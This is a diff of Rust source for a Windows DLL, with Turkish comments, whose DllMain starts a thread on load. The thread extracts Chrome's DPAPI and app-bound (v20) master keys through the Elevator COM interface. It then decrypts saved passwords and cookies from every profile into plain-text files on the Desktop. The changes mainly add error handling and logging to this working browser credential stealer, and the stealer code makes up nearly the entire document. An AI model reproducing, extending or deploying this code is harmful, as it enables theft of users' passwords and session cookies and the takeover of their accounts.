@@ -29,7 +29,7 @@ use aes_gcm::{
     Aes256Gcm, Nonce,
 };
 
-// Chrome 144+ için CLSID (aynı kalıyor)
+// Chrome 144+ için CLSID
 const CLSID_ELEVATOR: GUID = GUID {
     Data1: 0x708860E0,
     Data2: 0xF641,
@@ -158,45 +158,59 @@ fn aes_gcm_decrypt(key: &[u8], data: &[u8]) -> Result<Vec<u8>, String> {
 }
 
 fn do_work() -> Result<(), Box<dyn std::error::Error>> {
+    let _ = log_message("İşlem başlatıldı...");
     let user_profile = std::env::var("USERPROFILE")?;
     let chrome_data_path = Path::new(&user_profile).join("AppData\\Local\\Google\\Chrome\\User Data");
     let desktop_db_path = Path::new(&user_profile).join("Desktop\\chrome_db");
-    fs::create_dir_all(&desktop_db_path)?;
+
+    if !desktop_db_path.exists() {
+        fs::create_dir_all(&desktop_db_path)?;
+    }
 
     let local_state_path = chrome_data_path.join("Local State");
+    if !local_state_path.exists() {
+        return Err("Local State bulunamadı".into());
+    }
+
     let content = fs::read_to_string(&local_state_path)?;
     let json: Value = serde_json::from_str(&content)?;
 
     let mut master_keys_file = fs::File::create(desktop_db_path.join("master_keys.txt"))?;
 
-    // v10 Key
+    // v10 Key Extraction
     let mut v10_key = Vec::new();
     if let Some(os_crypt) = json.get("os_crypt") {
         if let Some(key_b64) = os_crypt.get("encrypted_key").and_then(|v| v.as_str()) {
             use base64::engine::Engine as _;
-            let encrypted_key = base64::engine::general_purpose::STANDARD.decode(key_b64)?;
-            if encrypted_key.starts_with(b"DPAPI") {
-                v10_key = decrypt_dpapi(&encrypted_key[5..])?;
-                writeln!(master_keys_file, "v10 Master Key (hex): {}", v10_key.iter().map(|b| format!("{:02x}", b)).collect::<String>())?;
+            if let Ok(encrypted_key) = base64::engine::general_purpose::STANDARD.decode(key_b64) {
+                if encrypted_key.starts_with(b"DPAPI") {
+                    if let Ok(k) = decrypt_dpapi(&encrypted_key[5..]) {
+                        v10_key = k;
+                        let _ = writeln!(master_keys_file, "v10 Master Key (hex): {}", v10_key.iter().map(|b| format!("{:02x}", b)).collect::<String>());
+                        let _ = log_message("v10 Master Key başarıyla çıkarıldı.");
+                    }
+                }
             }
         }
     }
 
-    // v20 Key (App-Bound)
+    // v20 Key Extraction (App-Bound)
     let mut v20_key = Vec::new();
     let key_b64 = json.get("app_bound_encrypted_key").and_then(|v| v.as_str())
         .or_else(|| json.get("os_crypt").and_then(|oc| oc.get("app_bound_encrypted_key")).and_then(|v| v.as_str()));
 
     if let Some(b64) = key_b64 {
         use base64::engine::Engine as _;
-        let decoded = base64::engine::general_purpose::STANDARD.decode(b64)?;
-        let blob = if decoded.starts_with(b"APPB") { &decoded[4..] } else { &decoded };
-        match decrypt_with_elevator(blob) {
-            Ok(k) => {
-                v20_key = k;
-                writeln!(master_keys_file, "v20 Master Key (hex): {}", v20_key.iter().map(|b| format!("{:02x}", b)).collect::<String>())?;
+        if let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) {
+            let blob = if decoded.starts_with(b"APPB") { &decoded[4..] } else { &decoded };
+            match decrypt_with_elevator(blob) {
+                Ok(k) => {
+                    v20_key = k;
+                    let _ = writeln!(master_keys_file, "v20 Master Key (hex): {}", v20_key.iter().map(|b| format!("{:02x}", b)).collect::<String>());
+                    let _ = log_message("v20 Master Key başarıyla çıkarıldı.");
+                }
+                Err(e) => { let _ = log_message(&format!("v20 Key Hatası: {}", e)); }
             }
-            Err(e) => writeln!(master_keys_file, "v20 Master Key Error: {}", e)?,
         }
     }
 
@@ -210,6 +224,7 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
         }
     }
     profiles.sort_by_key(|s| if s == "Default" { 0 } else { s[8..].parse::<u32>().unwrap_or(999) });
+    let _ = log_message(&format!("Bulunan profil sayısı: {}", profiles.len()));
 
     for profile in profiles {
         let profile_path = chrome_data_path.join(&profile);
@@ -217,59 +232,66 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
         fs::create_dir_all(&profile_output_path)?;
 
         let mut results_file = fs::File::create(profile_output_path.join("decrypted_data.txt"))?;
-        writeln!(results_file, "=== Profile: {} ===", profile)?;
+        let _ = writeln!(results_file, "=== Profil: {} ===", profile);
 
-        // Passwords
+        // Passwords Extraction
         let login_db = profile_path.join("Login Data");
         if login_db.exists() {
-            let temp_db = std::env::temp_dir().join(format!("chrome_login_{}.db", profile));
-            let _ = fs::copy(&login_db, &temp_db);
-            if let Ok(conn) = rusqlite::Connection::open(&temp_db) {
-                if let Ok(mut stmt) = conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
-                    let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, Vec<u8>>(2)?)))?;
-                    writeln!(results_file, "\n--- Passwords ---")?;
-                    for row in rows.flatten() {
-                        let (url, user, pass_blob) = row;
-                        let pass = if pass_blob.len() > 15 {
-                            let key = if pass_blob.starts_with(b"v20") { &v20_key } else { &v10_key };
-                            if !key.is_empty() {
-                                aes_gcm_decrypt(key, &pass_blob).unwrap_or_else(|_| b"[Decryption Failed]".to_vec())
-                            } else { b"[No Key]".to_vec() }
-                        } else { b"[Blob Too Short]".to_vec() };
-                        writeln!(results_file, "URL: {}\nUser: {}\nPass: {}\n", url, user, String::from_utf8_lossy(&pass))?;
-                    }
-                }
-            }
-            let _ = fs::remove_file(temp_db);
-        }
-
-        // Cookies
-        let cookie_db = profile_path.join("Network\\Cookies");
-        if cookie_db.exists() {
-            let temp_db = std::env::temp_dir().join(format!("chrome_cookies_{}.db", profile));
-            let _ = fs::copy(&cookie_db, &temp_db);
-            if let Ok(conn) = rusqlite::Connection::open(&temp_db) {
-                if let Ok(mut stmt) = conn.prepare("SELECT host_key, name, encrypted_value FROM cookies") {
-                    let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, Vec<u8>>(2)?)))?;
-                    writeln!(results_file, "\n--- Cookies ---")?;
-                    for row in rows.flatten() {
-                        let (host, name, blob) = row;
-                        if blob.len() > 15 {
-                            let is_v20 = blob.starts_with(b"v20");
-                            let key = if is_v20 { &v20_key } else { &v10_key };
-                            if !key.is_empty() {
-                                if let Ok(decrypted) = aes_gcm_decrypt(key, &blob) {
-                                    let val = if is_v20 && decrypted.len() > 32 { &decrypted[32..] } else { &decrypted[..] };
-                                    writeln!(results_file, "Host: {} | Name: {} | Value: {}", host, name, String::from_utf8_lossy(val))?;
+            let temp_db = profile_output_path.join("Login_Data.tmp");
+            if fs::copy(&login_db, &temp_db).is_ok() {
+                if let Ok(conn) = rusqlite::Connection::open(&temp_db) {
+                    if let Ok(mut stmt) = conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
+                        let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, Vec<u8>>(2)?)));
+                        if let Ok(rows) = rows {
+                            let _ = writeln!(results_file, "\n--- Şifreler ---");
+                            for row in rows.flatten() {
+                                let (url, user, blob) = row;
+                                if blob.len() > 15 {
+                                    let key = if blob.starts_with(b"v20") { &v20_key } else { &v10_key };
+                                    if !key.is_empty() {
+                                        let dec = aes_gcm_decrypt(key, &blob).unwrap_or_else(|_| b"[Çözme Başarısız]".to_vec());
+                                        let _ = writeln!(results_file, "URL: {}\nUser: {}\nPass: {}\n", url, user, String::from_utf8_lossy(&dec));
+                                    }
                                 }
                             }
                         }
                     }
                 }
+                let _ = fs::remove_file(temp_db);
             }
-            let _ = fs::remove_file(temp_db);
+        }
+
+        // Cookies Extraction
+        let cookie_db = profile_path.join("Network\\Cookies");
+        if cookie_db.exists() {
+            let temp_db = profile_output_path.join("Cookies.tmp");
+            if fs::copy(&cookie_db, &temp_db).is_ok() {
+                if let Ok(conn) = rusqlite::Connection::open(&temp_db) {
+                    if let Ok(mut stmt) = conn.prepare("SELECT host_key, name, encrypted_value FROM cookies") {
+                        let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, Vec<u8>>(2)?)));
+                        if let Ok(rows) = rows {
+                            let _ = writeln!(results_file, "\n--- Çerezler (Cookies) ---");
+                            for row in rows.flatten() {
+                                let (host, name, blob) = row;
+                                if blob.len() > 15 {
+                                    let is_v20 = blob.starts_with(b"v20");
+                                    let key = if is_v20 { &v20_key } else { &v10_key };
+                                    if !key.is_empty() {
+                                        if let Ok(dec) = aes_gcm_decrypt(key, &blob) {
+                                            let val = if is_v20 && dec.len() > 32 { &dec[32..] } else { &dec[..] };
+                                            let _ = writeln!(results_file, "Host: {} | Name: {} | Value: {}", host, name, String::from_utf8_lossy(val));
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                let _ = fs::remove_file(temp_db);
+            }
         }
     }
+    let _ = log_message("İşlem başarıyla tamamlandı.");
     Ok(())
 }
 
@@ -277,7 +299,9 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
 pub extern "system" fn DllMain(_hinst: *mut std::ffi::c_void, fdw_reason: u32, _lpv_reserved: *mut std::ffi::c_void) -> i32 {
     if fdw_reason == DLL_PROCESS_ATTACH {
         thread::spawn(|| {
-            let _ = do_work().map_err(|e| { let _ = log_message(&format!("HATA: {}", e)); });
+            if let Err(e) = do_work() {
+                let _ = log_message(&format!("HATA: {}", e));
+            }
         });
     }
     1
